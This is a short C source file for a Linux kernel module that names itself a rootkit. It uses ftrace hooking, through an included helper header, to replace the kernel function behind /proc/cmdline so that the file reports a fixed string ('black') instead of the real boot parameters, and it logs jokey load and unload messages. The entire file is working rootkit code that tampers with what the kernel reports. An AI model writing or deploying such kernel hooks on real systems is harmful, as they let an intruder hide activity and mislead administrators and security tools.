#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("black");
MODULE_VERSION("1.00");

static asmlinkage long (*cmdline_proc_show)(struct seq_file *m, void *v);

static int hook_cmdline_proc_show(struct seq_file *m, void *v)
{
	seq_printf(m, "%s\n", "black");
	return 0;
}

static struct ftrace_hook hooks[] = {
	HOOK("cmdline_proc_show", hook_cmdline_proc_show, &cmdline_proc_show),
};

static int __init rootkit_init(void)
{
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
